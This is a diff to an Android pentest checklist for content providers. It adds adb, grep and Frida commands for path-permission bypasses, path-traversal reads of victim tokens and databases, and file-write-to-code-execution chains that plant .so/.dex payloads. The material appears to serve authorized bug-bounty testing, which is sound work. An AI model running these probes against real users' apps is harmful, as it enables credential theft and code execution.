-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | providers declaring `<path-permission>` |
 | **Requires** | provider, device |
@@ -798,12 +823,12 @@ Log.i("poc","bulkInsert rows=" + n);
   back to the provider-level permission — and if none is declared, to nothing.
 - **How:**
 ```bash
-xmllint --format out/AndroidManifest.xml | sed -n '/<provider/,/<\/provider>/p'
+xmllint --format "$DEC/apktool/AndroidManifest.xml" | sed -n '/<provider/,/<\/provider>/p'
 # for each <path-permission>, construct a URI the pattern does NOT match but the provider still serves
-adb shell content query --uri content://com.target.app.provider/protected        # expect denial
-adb shell content query --uri content://com.target.app.provider/protected/sub    # prefix vs exact
-adb shell content query --uri content://com.target.app.provider/protectedX       # pathPattern greed
-adb shell content query --uri content://com.target.app.provider/Protected        # case
+adb -s "$SERIAL" shell content query --uri content://com.target.app.provider/protected        # expect denial
+adb -s "$SERIAL" shell content query --uri content://com.target.app.provider/protected/sub    # prefix vs exact
+adb -s "$SERIAL" shell content query --uri content://com.target.app.provider/protectedX       # pathPattern greed
+adb -s "$SERIAL" shell content query --uri content://com.target.app.provider/Protected        # case
 ```
   Remember `UriMatcher` `#` is digits-only and `*` is any segment — a `path-permission` written for
   `/items/#` does not cover `/items/abc` if the matcher routes both.
@@ -818,19 +843,20 @@ adb shell content query --uri content://com.target.app.provider/Protected       
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all providers doing path-based authorisation |
 | **Requires** | provider, device |
 | **Maps to** | MASTG-TEST-0355 (the Sieve example); HackTricks `drozer-tutorial/exploiting-content-providers.md` — "the path `/Keys/` is accessible ... which is not protected due to a mistake by the developer, who secured `/Keys` but declared `/Keys/`" |
 
-- **Test:** The canonical provider bug and still a live one. A `<path-permission android:path="/Keys">`
+- **Test:** The worked example of D07-022's variant matrix (the trailing-slash row); settle both rows with the
+  one D07-022 sweep. The canonical provider bug and still a live one. A `<path-permission android:path="/Keys">`
   protects exactly `/Keys`. `/Keys/` is a different string, matches a different `UriMatcher` arm, and is
   served unprotected.
 - **How:**
 ```bash
-adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys
-adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/
+adb -s "$SERIAL" shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys
+adb -s "$SERIAL" shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/
 ```
 ```
 # the canonical output pair
@@ -842,15 +868,15 @@ Keys/  -> Row: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234
 - **Escalation:** Always attempt the **write** through whichever variant granted read
   (`content update --bind password:s:...`). That single extra command is the difference between a Medium
   information disclosure and a Critical account takeover.
-- **Ruled out when:** Both forms return the same `Permission Denial`, and the same is true for the other
-  variants in D07-022. One form tested is not a test.
+- **Ruled out when:** Settled by D07-022 — both forms return the same `Permission Denial`, and the same is
+  true for the other variants in that matrix. One form tested is not a test.
 
 ### D07-022 · `UriMatcher` normalisation variant fuzz
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider, device |
@@ -869,7 +895,7 @@ Keys/  -> Row: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234
 ```bash
 for v in keys "keys/" "keys//" "keys/////" "keys/1" KEYS "keys/x" "./keys" "keys/../keys"; do
   printf '%-28s ' "$v"
-  adb shell content query --uri "content://com.target.app.provider/$v" 2>&1 | head -1
+  adb -s "$SERIAL" shell content query --uri "content://com.target.app.provider/$v" 2>&1 | head -1
 done
 ```
   Use the Python harness in D07-009 for anything wider than this; count the probes.
@@ -883,7 +909,7 @@ done
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | providers that authorise on the caller's identity |
 | **Requires** | provider |
@@ -895,9 +921,9 @@ done
   whole security property.
 - **How:**
 ```bash
-grep -rnE 'getCallingPackageUnchecked|getCallingPackage\(\)|getCallingAttributionSource|getCallingUid|Binder\.getCallingUid' out/sources/
+grep -rnE 'getCallingPackageUnchecked|getCallingPackage\(\)|getCallingAttributionSource|getCallingUid|Binder\.getCallingUid' "$DEC/jadx/sources/"
 # for each hit, read the branch it gates
-grep -rn -B4 -A20 'getCallingPackageUnchecked' out/sources/
+grep -rn -B4 -A20 'getCallingPackageUnchecked' "$DEC/jadx/sources/"
 ```
   Then call from a stub that names the privileged package in whatever channel the provider reads
   (an extra, an attribution tag, a `call()` bundle key).
@@ -913,7 +939,7 @@ grep -rn -B4 -A20 'getCallingPackageUnchecked' out/sources/
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 (needs a grant primitive from D08) |
 | **Applies to** | all |
 | **Requires** | provider |
@@ -925,9 +951,9 @@ grep -rn -B4 -A20 'getCallingPackageUnchecked' out/sources/
   android:pathPattern=".*">` or `android:path="/"` is the same thing written the long way.
 - **How:**
 ```bash
-grep -nE 'grantUriPermissions|<grant-uri-permission' -A4 out/AndroidManifest.xml
-grep -rnE 'FLAG_GRANT_READ_URI_PERMISSION|FLAG_GRANT_WRITE_URI_PERMISSION|FLAG_GRANT_PERSISTABLE_URI_PERMISSION|FLAG_GRANT_PREFIX_URI_PERMISSION|grantUriPermission\(|setClipData\(' out/sources/
-adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
+grep -nE 'grantUriPermissions|<grant-uri-permission' -A4 "$DEC/apktool/AndroidManifest.xml"
+grep -rnE 'FLAG_GRANT_READ_URI_PERMISSION|FLAG_GRANT_WRITE_URI_PERMISSION|FLAG_GRANT_PERSISTABLE_URI_PERMISSION|FLAG_GRANT_PREFIX_URI_PERMISSION|grantUriPermission\(|setClipData\(' "$DEC/jadx/sources/"
+adb -s "$SERIAL" shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
 ```
 - **Proof:** `dumpsys activity permissions` listing a live grant to your PoC package for a URI outside the
   intended scope, plus a successful `content read` on it.
@@ -935,14 +961,15 @@ adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p
   radius. File the grant-config observation as the primitive and the redirection as the consumer (D07-076).
 - **Ruled out when:** `grantUriPermissions="false"` (or absent) and no `<grant-uri-permission>` child exists
   — then grants are impossible for that authority and the provider's declared permissions are the whole
-  story.
+  story. Where the attribute is `true`, the row depends on the D08 redirector/grant census and stays
+  `blocked: D08 census incomplete` until that census is complete (D07-025).
 
 ### D07-025 · `exported="false"` plus `grantUriPermissions="true"` is reachable, not closed
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider |
@@ -954,24 +981,31 @@ adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p
   non-exported provider into the ruled-out register without checking `grantUriPermissions` first.
 - **How:**
 ```bash
-grep -nE 'grantUriPermissions' out/AndroidManifest.xml
+grep -nE 'grantUriPermissions' "$DEC/apktool/AndroidManifest.xml"
 # find any component that echoes or forwards an attacker-supplied Intent
-grep -rnE 'setResult\(|startActivity\(.*getIntent|startActivityForResult\(.*getParcelableExtra|PendingIntent\.(getActivity|getService|getBroadcast)' out/sources/
+grep -rnE 'setResult\(|startActivity\(.*getIntent|startActivityForResult\(.*getParcelableExtra|PendingIntent\.(getActivity|getService|getBroadcast)' "$DEC/jadx/sources/"
+grep -rn 'removeLaunchSecurityProtection' "$DEC/jadx/sources/"   # Android 16 opt-out of nested-intent launch protection (D08-019)
 ```
   Then run the D08 laundering PoC: your activity sends the victim an Intent it forwards back with the grant
   flags set and a `data` URI under the non-exported authority.
 - **Proof:** `openInputStream()` on the non-exported authority succeeding in your PoC after the round trip,
   where the same call before the round trip threw `SecurityException`. Both calls in one logcat capture.
 - **Escalation:** -> D08 for the redirector; -> D07-057 for what the grant then reaches.
-- **Ruled out when:** `grantUriPermissions` is false/absent on that authority **and** no component forwards
-  an attacker Intent **and** no `PendingIntent` is handed out with a mutable base Intent.
+- **Ruled out when:** **Precondition:** the D08 redirector and grant census is complete (every row of D08's
+  `setResult`/`startActivity(getIntent...)`/mutable-`PendingIntent` items settled). Until then this row is
+  `blocked: D08 census incomplete`, never `ruled-out`. Then: `grantUriPermissions` is false/absent on that
+  authority **and** no component forwards an attacker Intent **and** no `PendingIntent` is handed out with a
+  mutable base Intent. On Android 16 with the app targeting 36, nested-intent launch protection applies
+  unless the app calls `removeLaunchSecurityProtection()` — state the device/API the chain was proven on,
+  and if it is below 16 retest on 16 before filing (the chain may still work on every device below 16,
+  which is a scope statement, not a retraction).
 
 ### D07-026 · `FLAG_GRANT_PREFIX_URI_PERMISSION` grants the subtree, not the file
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03/AM-04 |
 | **Applies to** | all |
 | **Requires** | provider, device |
@@ -981,12 +1015,12 @@ grep -rnE 'setResult\(|startActivity\(.*getIntent|startActivityForResult\(.*getP
   After receiving any grant, always probe siblings before concluding the share was scoped.
 - **How:**
 ```bash
-grep -rn 'FLAG_GRANT_PREFIX_URI_PERMISSION' out/sources/
+grep -rn 'FLAG_GRANT_PREFIX_URI_PERMISSION' "$DEC/jadx/sources/"
 # receive a legitimate share, then walk sideways
-adb shell content read --uri 'content://com.target.app.fileprovider/shared/IMG_0001.jpg'   # the granted one
-adb shell content read --uri 'content://com.target.app.fileprovider/shared/IMG_0002.jpg'   # a sibling
-adb shell content read --uri 'content://com.target.app.fileprovider/shared/../cache/x'     # up a level
-adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/shared/IMG_0001.jpg'   # the granted one
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/shared/IMG_0002.jpg'   # a sibling
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/shared/../cache/x'     # up a level
+adb -s "$SERIAL" shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
 ```
 - **Proof:** Bytes returned for a sibling URI you were never explicitly granted, with `dumpsys` showing a
   single prefix grant as the source.
@@ -1000,7 +1034,7 @@ adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
 | **Attacker** | AM-03/AM-04, recipient of a legitimate share |
 | **Applies to** | all with SAF / share flows |
 | **Requires** | provider, device |
@@ -1016,9 +1050,10 @@ adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p
 getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
 ```
 ```bash
-grep -rnE 'FLAG_GRANT_PERSISTABLE_URI_PERMISSION|takePersistableUriPermission|revokeUriPermission' out/sources/
-adb reboot && adb wait-for-device
-adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
+grep -rnE 'FLAG_GRANT_PERSISTABLE_URI_PERMISSION|takePersistableUriPermission|revokeUriPermission' "$DEC/jadx/sources/"
+adb -s "$SERIAL" reboot && adb -s "$SERIAL" wait-for-device
+adb -s "$SERIAL" shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'   # UriGrantsManagerService; 'activity providers' lists providers, not grants
+# persisted grants also survive in /data/system/urigrants.xml (root lab device only)
 # then delete the item in the target app's UI and re-read from the PoC
 ```
 - **Proof:** `dumpsys` listing the persisted grant to your package after reboot, plus your PoC still
@@ -1033,7 +1068,7 @@ adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.file_inclusion.local` (P1); fallback `server_security_misconfiguration.path_traversal` (VARIES) |
+| **VRT** | `server_side_injection.file_inclusion.local` (P1); fallback `server_security_misconfiguration.path_traversal` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all providers implementing any `open*` method |
 | **Requires** | provider, device |
@@ -1051,10 +1086,10 @@ public ParcelFileDescriptor openFile(Uri uri, String mode) {
 }
 ```
 ```bash
-grep -rn -A25 'public ParcelFileDescriptor openFile\|openAssetFile\|openTypedAssetFile\|openFileHelper' out/sources/
-grep -rn 'getCanonicalPath\|getCanonicalFile' out/sources/    # ABSENCE is the finding
-adb shell content read --uri 'content://com.target.app.provider/../../shared_prefs/auth.xml'
-adb shell content read --uri 'content://com.target.app.provider/files/../../databases/app.db' | head -c 64 | xxd
+grep -rn -A25 'public ParcelFileDescriptor openFile\|openAssetFile\|openTypedAssetFile\|openFileHelper' "$DEC/jadx/sources/"
+grep -rn 'getCanonicalPath\|getCanonicalFile' "$DEC/jadx/sources/"    # ABSENCE is the finding
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.provider/../../shared_prefs/auth.xml'
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.provider/files/../../databases/app.db' | head -c 64 | xxd
 ```
 ```java
 getContentResolver().openInputStream(Uri.parse(
@@ -1063,13 +1098,35 @@ getContentResolver().openInputStream(Uri.parse(
 - **Proof:** The literal bytes of a victim-private file: `<map><string name="access_token">eyJ...` from
   `shared_prefs`, or the magic `SQLite format 3` from `databases/`. Hexdump the first 16 bytes so the
   triager can see it is the real file, and contrast an identical direct `open()` from your UID failing with
-  `EACCES`.
+  `EACCES`. If the first 16 bytes are random, check `grep -rl 'net.sqlcipher\|SQLiteDatabase.loadLibs\|SupportFactory' "$DEC/jadx/sources"`
+  — a SQLCipher database starts with a 16-byte salt, not the magic; the traversal is still proven by the
+  byte count matching `run-as ls -l` and by any plaintext file alongside it. Rate the payload on what the
+  key derivation allows (D11).
 - **Escalation:** -> D11 for what the file holds, -> D13/D15 for the token. If the mode string permits `w`,
   go to D07-035 and then -> D17 code execution.
 - **Ruled out when:** The provider extends AndroidX `FileProvider` unmodified (it canonicalises and throws
   `IllegalArgumentException: Failed to find configured root that contains ...`), **or** the custom
   implementation calls `getCanonicalPath()` and compares with `startsWith(root.getCanonicalPath())` before
-  opening — show the decompiled check, and show your `../` probe hitting it.
+  opening — show the decompiled check, and show your `../` probe hitting it. When the provider is
+  `exported="false"` and no grant path exists, the probe cannot reach the check from an app UID; the accepted
+  controlled experiment is **in-process invocation on the lab device**: hook the app and call its own resolver
+  on its own authority with the traversal strings, so the acquisition check passes (same UID) and the
+  provider's canonicalisation code is what decides. Record it as a lab-only negative control, never as AM-03
+  evidence:
+```bash
+frida -D "$SERIAL" -n "$PKG" -t 15 -l canon-probe.js | tee logs/D07-028-inproc.txt
+```
+```js
+// canon-probe.js — in-process negative control: does the provider's own canonicalisation reject traversal?
+Java.perform(() => {
+  const ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
+  const Uri = Java.use('android.net.Uri');
+  for (const p of ['files/../shared_prefs/x.xml', 'files/..%2Fshared_prefs%2Fx.xml']) {
+    try { ctx.getContentResolver().openInputStream(Uri.parse('content://<authority>/' + p)); console.log('OPENED ' + p); }
+    catch (e) { console.log('REJECTED ' + p + ' -> ' + e.toString()); }
+  }
+});
+```
 
 ### D07-029 · The `%2F` decode mismatch — `Uri` accessors decode after the string check
 
@@ -1089,13 +1146,13 @@ getContentResolver().openInputStream(Uri.parse(
   encoded differential is itself the proof that the decode order is the defect.
 - **How:**
 ```bash
-grep -rnE 'getLastPathSegment\(\)|getPathSegments\(\)|uri\.getPath\(\)' out/sources/ \
+grep -rnE 'getLastPathSegment\(\)|getPathSegments\(\)|uri\.getPath\(\)' "$DEC/jadx/sources/" \
   | grep -iE 'new File\(|openFile|FileInputStream|FileOutputStream|ParcelFileDescriptor\.open'
 # real-world shape (Google app CommonContentProvider):
 #   return ParcelFileDescriptor.open(new File(i, uri.getLastPathSegment()),
 #          ParcelFileDescriptor.parseMode(str.toLowerCase(Locale.getDefault())));
-adb shell content read --uri 'content://com.target.app.provider/..%2F..%2Fshared_prefs%2Fauth.xml'
-adb shell content read --uri 'content://com.target.app.provider/..%2Fdatabases%2Fapp.db' > app.db
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.provider/..%2F..%2Fshared_prefs%2Fauth.xml'
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.provider/..%2Fdatabases%2Fapp.db' > app.db
 ```
   The safe forms to grep for are `getEncodedPath()` or canonicalise-then-`startsWith(base)`.
 - **Proof:** The encoded form returning file content while the plain `../` form is rejected. Both outputs
@@ -1124,12 +1181,12 @@ adb shell content read --uri 'content://com.target.app.provider/..%2Fdatabases%2
 ```bash
 for i in 1 2 3 4 5 6 7 8; do
   P=$(python3 -c "print('../'*$i)")
-  echo "== depth $i"; adb shell content read --uri "content://com.target.app.provider/${P}proc/version" 2>&1 | head -2
+  echo "== depth $i"; adb -s "$SERIAL" shell content read --uri "content://com.target.app.provider/${P}proc/version" 2>&1 | head -2
 done
 # encoded form of the same sweep
-adb shell content read --uri "content://com.target.app.provider/..%2F..%2F..%2Fproc/version"
+adb -s "$SERIAL" shell content read --uri "content://com.target.app.provider/..%2F..%2F..%2Fproc/version"
 # pivot at the winning depth
-adb shell content read --uri "content://com.target.app.provider/../../../data/data/com.target.app/shared_prefs/auth.xml"
+adb -s "$SERIAL" shell content read --uri "content://com.target.app.provider/../../../data/data/com.target.app/shared_prefs/auth.xml"
 ```
 - **Proof:** `Linux version 5.x ... gcc ...` at a given depth. `/proc/version` is still readable on API 30+
   and is the best first canary. `/etc/hosts` (`127.0.0.1 localhost`) is the second — but **some OEM SELinux
@@ -1138,7 +1195,8 @@ adb shell content read --uri "content://com.target.app.provider/../../../data/da
   makes it a report rather than a curiosity.
 - **Ruled out when:** All eight depths and both encodings return `FileNotFoundException` or
   `IllegalArgumentException: Failed to find configured root`, and the canonicalisation check from D07-028
-  is present in the decompiled source.
+  is present in the decompiled source. For an `exported="false"` provider with no grant path, the depth sweep
+  is run as the in-process control of D07-028 (lab-only), not from the shell UID.
 
 ### D07-031 · Infer file-backed versus SQLite-backed before you fuzz
 
@@ -1156,10 +1214,10 @@ adb shell content read --uri "content://com.target.app.provider/../../../data/da
   Classify first, then choose the attack.
 - **How:**
 ```bash
-adb shell content query --uri content://com.target.app.provider/x 2>&1 | head -2
-adb shell content read  --uri content://com.target.app.provider/x 2>&1 | head -2
-adb shell content gettype --uri content://com.target.app.provider/x
-grep -rn 'public Cursor query(\|public ParcelFileDescriptor openFile(\|extends FileProvider\|extends DocumentsProvider' out/sources/
+adb -s "$SERIAL" shell content query --uri content://com.target.app.provider/x 2>&1 | head -2
+adb -s "$SERIAL" shell content read  --uri content://com.target.app.provider/x 2>&1 | head -2
+adb -s "$SERIAL" shell content gettype --uri content://com.target.app.provider/x
+grep -rn 'public Cursor query(\|public ParcelFileDescriptor openFile(\|extends FileProvider\|extends DocumentsProvider' "$DEC/jadx/sources/"
 ```
 
 | Signature | Classification | Go to |
@@ -1200,7 +1258,7 @@ for P in \
   "a/../../../$TARGET" \
   "./../../$TARGET" ; do
   printf '%-40s ' "${P:0:38}"
-  adb shell content read --uri "content://com.target.app.provider/$P" 2>&1 | head -c 120; echo
+  adb -s "$SERIAL" shell content read --uri "content://com.target.app.provider/$P" 2>&1 | head -c 120; echo
 done
 ```
   `....//` defeats a single-pass strip; `%252F` defeats a double-decode; a leading real segment (`a/../`)
@@ -1247,7 +1305,7 @@ drozer> run app.provider.download content://<auth>/a/../../../../data/data/com.t
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all providers implementing `openFile` |
 | **Requires** | provider, device |
@@ -1261,8 +1319,8 @@ drozer> run app.provider.download content://<auth>/a/../../../../data/data/com.t
   becomes writable through the weaker guard.
 - **How:**
 ```bash
-grep -rn -A12 'public ParcelFileDescriptor openFile' out/sources/
-grep -rnE 'ParcelFileDescriptor\.open|parseMode|MODE_READ_WRITE|MODE_WRITE_ONLY|268435456|1006632960' out/sources/
+grep -rn -A12 'public ParcelFileDescriptor openFile' "$DEC/jadx/sources/"
+grep -rnE 'ParcelFileDescriptor\.open|parseMode|MODE_READ_WRITE|MODE_WRITE_ONLY|268435456|1006632960' "$DEC/jadx/sources/"
 ```
 ```java
 // read the file through the WRITE-permission code path
@@ -1270,8 +1328,8 @@ ParcelFileDescriptor pfd = getContentResolver().openFile(uri, "w", null);
 InputStream in = new FileInputStream(pfd.getFileDescriptor());
 ```
 ```bash
-adb shell content write --uri 'content://com.target.app.provider/config' < attacker.json
-adb shell content read  --uri 'content://com.target.app.provider/config'
+adb -s "$SERIAL" shell content write --uri 'content://com.target.app.provider/config' < attacker.json
+adb -s "$SERIAL" shell content read  --uri 'content://com.target.app.provider/config'
 ```
 - **Proof:** The read succeeding through a write-mode request on a provider whose read is denied, or a write
   succeeding on a URI whose `readPermission`/`<path-permission>` implies read-only — verified by reading the
@@ -1286,27 +1344,32 @@ adb shell content read  --uri 'content://com.target.app.provider/config'
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) once execution is demonstrated; `server_security_misconfiguration.path_traversal` (VARIES) for the write alone |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) once execution is demonstrated; `server_security_misconfiguration.path_traversal` (varies) for the write alone |
 | **Attacker** | AM-03 |
 | **Applies to** | providers whose `open*` honours a write mode |
 | **Requires** | provider, device |
 | **Maps to** | CVE-2025-48636; Oversecured `TheftOverwriteProvider` (OVAA); Google Mobile VRP: "Path traversal / zip path traversal vulnerabilities leading to arbitrary file write" — and the explicit rule that "if you do not demonstrate this [ACE] in your report, the reward amount will not reflect this" |
 
 - **Test:** The same primitive as D07-028 in the other direction. The write alone underpays; plan the
-  write-then-load chain from the start. Enumerate what the app loads before you choose a destination.
+  write-then-load chain from the start. Enumerate what the app loads before you choose a destination. A
+  write primitive confined to `cache/` is not automatically dead: ART's runtime app image under
+  `cache/oat_primary/<isa>/` is app-writable and mapped at the next launch — evaluate whether the image is
+  validated before use on the lab build before ruling the destination out.
 - **How:**
 ```bash
 # 1. find the loaders
-grep -rnE 'System\.load\(|System\.loadLibrary\(|DexClassLoader|PathClassLoader|InMemoryDexClassLoader|createPackageContext' out/sources/
-adb shell run-as com.target.app ls -la lib/ lib-main/ files/ code_cache/ app_dex/ 2>/dev/null
+grep -rnE 'System\.load\(|System\.loadLibrary\(|DexClassLoader|PathClassLoader|InMemoryDexClassLoader|createPackageContext' "$DEC/jadx/sources/"
+adb -s "$SERIAL" shell run-as com.target.app ls -la lib/ lib-main/ files/ code_cache/ app_dex/ 2>/dev/null
+# candidate loaded at startup without an explicit loader call — evaluate, do not assume
+adb -s "$SERIAL" shell run-as com.target.app ls -la cache/oat_primary/*/ 2>/dev/null   # base.art / base.odex / base.vdex (ART runtime app image)
 # 2. write through the traversal
-adb shell 'content write --uri "content://com.target.app.provider/files/..%2Flib%2Fpwn.so"' < pwn.so
-adb shell 'content write --uri "content://com.target.app.provider/files/../code_cache/plugin.dex"' < plugin.dex
+adb -s "$SERIAL" shell 'content write --uri "content://com.target.app.provider/files/..%2Flib%2Fpwn.so"' < pwn.so
+adb -s "$SERIAL" shell 'content write --uri "content://com.target.app.provider/files/../code_cache/plugin.dex"' < plugin.dex
 # 3. prove the write
-adb shell run-as com.target.app ls -l lib/ code_cache/
+adb -s "$SERIAL" shell run-as com.target.app ls -l lib/ code_cache/
 # 4. prove execution — restart and catch JNI_OnLoad / static initialiser
-adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
-adb logcat -s pwn:V
+adb -s "$SERIAL" shell am force-stop com.target.app && adb -s "$SERIAL" shell monkey -p com.target.app 1
+adb -s "$SERIAL" logcat -s pwn:V
 ```
 - **Proof:** Your file at the traversed path (`run-as ls -l` on a debuggable build, or a root `ls` on the
   research device with the mtime change), then a log line emitted by your own `JNI_OnLoad` or static
@@ -1334,16 +1397,16 @@ adb logcat -s pwn:V
   canonicalisation the app might have.
 - **How:**
 ```bash
-grep -rn 'openFileHelper\|"_data"\|MediaStore.MediaColumns.DATA' out/sources/
+grep -rn 'openFileHelper\|"_data"\|MediaStore.MediaColumns.DATA' "$DEC/jadx/sources/"
 # seed a path, then open it
-adb shell content insert --uri content://com.target.app.provider/files \
+adb -s "$SERIAL" shell content insert --uri content://com.target.app.provider/files \
   --bind _data:s:/data/data/com.target.app/shared_prefs/auth.xml --bind mime_type:s:text/plain
-adb shell content query --uri content://com.target.app.provider/files --projection "_id,_data" | tail -3
-adb shell content read --uri content://com.target.app.provider/files/<returned_id>
+adb -s "$SERIAL" shell "content query --uri content://com.target.app.provider/files --projection \"_id,_data\"" | tail -3
+adb -s "$SERIAL" shell content read --uri content://com.target.app.provider/files/<returned_id>
 # the MediaStore analogue, for the cross-provider version of the same trick
-adb shell 'cd /sdcard && echo "hello" > t.txt'
-adb shell content insert --uri content://media/external/file --bind _data:s:/storage/emulated/0/t.txt --bind mime_type:s:text/plain
-adb shell content query  --uri content://media/external/file --projection _id,_data | grep t.txt
+adb -s "$SERIAL" shell 'cd /sdcard && echo "hello" > t.txt'
+adb -s "$SERIAL" shell content insert --uri content://media/external/file --bind _data:s:/storage/emulated/0/t.txt --bind mime_type:s:text/plain
+adb -s "$SERIAL" shell "content query  --uri content://media/external/file --projection _id,_data" | grep t.txt
 ```
 - **Proof:** A row you inserted whose `_data` names a victim-private path, followed by `content read` on
   that row's URI returning the file's bytes.
@@ -1366,13 +1429,22 @@ adb shell content query  --uri content://media/external/file --projection _id,_d
 - **Test:** A provider that calls `getCanonicalPath()`, validates the prefix, and *then* opens the file has
   a window. An attacker who controls the path (because it lives on shared storage, or in a directory the
   attacker can write) swaps a benign file for a symlink between the check and the open. The correct
-  defence is an `fstat` on the returned descriptor compared against an `lstat` of the canonical path.
+  defence is an `fstat` on the returned descriptor compared against an `lstat` of the canonical path. This
+  item owns the provider-side check; the race procedure itself (timing, the swap loop) is D11-049 — run it
+  there and record the provider's handling here.
 - **How:**
 ```bash
-grep -rn -A15 'getCanonicalPath' out/sources/ | grep -nE 'ParcelFileDescriptor\.open|FileInputStream|Os\.fstat|Os\.lstat|S_ISLNK'
-adb shell 'ln -s /data/data/com.target.app/shared_prefs/auth.xml /sdcard/Android/data/com.poc/files/pic.jpg'
-adb shell content read --uri 'content://com.target.app.provider/external/pic.jpg'
+grep -rn -A15 'getCanonicalPath' "$DEC/jadx/sources/" | grep -nE 'ParcelFileDescriptor\.open|FileInputStream|Os\.fstat|Os\.lstat|S_ISLNK'
+# lab control only (shell UID, real filesystem): symlinks cannot be created on external storage
+adb -s "$SERIAL" shell 'ln -s /data/data/com.target.app/shared_prefs/auth.xml /data/local/tmp/pic.jpg'
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.provider/external/pic.jpg'
 ```
+  Symlinks cannot be created on external storage (emulated/FUSE volumes return `EPERM`), and from Android 12
+  the victim process cannot open files under another app's data directory (`ls -Z /data/data/<pkg>` shows
+  per-app `c` categories), so an AM-03 symlink needs an attacker-writable directory on a real filesystem
+  that the victim can traverse — on a modern device this almost never exists. Demonstrate the provider's
+  symlink handling as a **lab control** from `/data/local/tmp` (shell), label it as not AM-03, and report
+  the class only if the app itself exposes such a directory (a world-writable path it creates, D11).
   The documented safe form, whose **absence** is the detection signature:
 ```kotlin
 val fdCanonical = File(fileUri.path!!).canonicalPath
@@ -1396,7 +1468,7 @@ val sameFile = pfdStat.st_dev == canonicalFileStat.st_dev && pfdStat.st_ino == c
 | **Attacker** | AM-03 |
 | **Applies to** | all SQLite-backed providers |
 | **Requires** | provider, device |
-| **Maps to** | MASTG-TEST-0339, MASTG-TEST-0025, MASWE-0050 (CWE-89, CWE-20), MASTG-KNOW-0117, rule `mastg-android-sql-injection-contentprovider.yml`, MASTG-TOOL-0110; H1 #291764 (Nextcloud, Low 0.9, $150), #1650264 (ownCloud, Medium 4.2, GHSL-2022-059), #887968 (Mail.ru `ru.mail.data.contact.ContactsProvider`), #143280 (Mail.ru, $250) |
